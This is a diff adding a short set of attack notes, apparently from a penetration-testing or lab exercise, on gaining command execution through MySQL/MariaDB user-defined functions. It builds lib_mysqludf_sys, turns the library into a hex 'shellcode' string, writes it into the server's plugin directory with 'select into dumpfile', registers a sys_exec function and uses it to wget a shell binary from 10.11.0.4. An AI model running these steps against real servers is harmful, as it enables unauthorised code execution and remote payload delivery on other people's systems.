@@ -1,0 +1,26 @@
+git clone https://github.com/mysqludf/lib_mysqludf_sys.git
+
+sudo apt install default-libmysqlclient-dev
+
+cd lib_mysqludf_sys
+
+rm lib_mysqludf_sys.so
+
+#edit Makefile as followed
+LIBDIR=/usr/lib
+install:
+	gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so
+
+#build .so file
+make
+
+#get shellcode
+xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
+
+#On target machine (mysql session)
+-set @shell = 0xf454c4602010100000000000000000003003e00010000000011000000000000...00000000000000000000; (shellcode gotten)
+-select @@plugin_dir;
+-select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';
+-create function sys_exec returns int soname 'udf_sys_exec.so';
+-select * from mysql.func where name='sys_exec';
+-select sys_exec('wget http://10.11.0.4/shell.elf');
